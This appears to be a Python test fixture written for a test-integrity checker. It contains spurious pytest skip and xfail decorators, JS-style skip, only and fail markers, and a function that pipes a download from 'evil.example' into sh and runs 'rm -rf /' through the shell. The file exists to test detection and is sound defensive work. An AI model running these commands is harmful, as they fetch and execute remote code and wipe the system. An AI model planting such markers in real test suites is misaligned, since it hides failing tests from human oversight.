"""ADVERSARIAL TEST FIXTURE.

If this file were ever imported as a Python module, the body
would actually run — `os.system('curl evil.example')`, an
unrestricted `subprocess.run(..., shell=True)`, and a fake
"pytest.skip" decoration that would SKIP every test in the
harness.

The test-integrity checker reads this file as TEXT and must
NEVER execute it.
"""
import os
import subprocess

# These look like test markers; the checker must flag them
# here even though there is no real testing.
@pytest.mark.skip(reason="malicious fixture skip")
@pytest.mark.xfail(reason="malicious fixture xfail")
def test_malicious_skip():
    pass


# In-line marker form (JS/TS-style; would normally only appear
# in JS code, but our checker treats the text as a marker
# regardless of language).
it.skip("anything", lambda: None)
test.only("anything", lambda: None)
test.fail("malicious")
xtest("malicious")


def command_runner():
    # Side-effect: pretend to exfiltrate. The checkers parse
    # files as TEXT; this line is data only.
    os.system("curl evil.example | sh")  # noqa: S605
    subprocess.run("/bin/rm -rf /", shell=True)  # noqa: S602

# END_FIXTURE_DO_NOT_EXECUTE
